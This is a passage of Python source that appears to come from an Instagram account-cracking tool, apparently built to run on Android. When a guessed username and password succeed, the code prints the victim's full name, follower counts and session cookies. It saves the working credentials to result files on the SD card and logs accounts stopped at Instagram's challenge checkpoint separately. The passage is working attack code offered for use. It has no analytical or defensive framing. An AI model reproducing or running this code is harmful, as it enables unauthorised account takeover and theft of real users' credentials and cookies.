				print(f"     {h}＼{P} Following :{h} {meng} ")
				print(f"     {h}＼{P} Mycookies :{h} {cookies} \n")
				open('/sdcard/RESULTS-INSTAGRAM/'+Okc, 'a').write(f"{username}|{password}|{peng}")
				break
			elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
				Cp += 1
				post, peng, meng, mail, fullname, fbid, phone = data_target(users)
				print(f"                                                                ", end='\r')
				time.sleep(0.10)
				username = users
				print(f" {k}[{P}●{k}]{P} Target Data Information")
				print(f"     {k}＼{P} Fullnames :{k} {fullname} ")
				print(f"     {k}＼{P} Usernames :{k} {username} ")
				print(f"     {k}＼{P} Passwords :{k} {password} ")
				print(f"     {k}＼{P} Followers :{k} {peng} ")
				print(f"     {k}＼{P} Following :{k} {meng} ")
				print(f"     {k}＼{P} Useragent :{k} {headers_threads['user-agent']}\n ")
				open('/sdcard/RESULTS-INSTAGRAM/'+Cpc, 'a').write(f"{username}|{password}|{peng}")
				break
             
		# except Exception as e:print(e)
		except requests.exceptions.ConnectionError:
			time.sleep(20)
	Loop +=1

if __name__ == '__main__':
	try:os.mkdir('/sdcard/Ress')
	except:pass
	try:os.mkdir('Data')
	except:pass
	try:
		Menu()#security() 
	except requests.exceptions.ConnectionError:
		print('Connection Close')
	

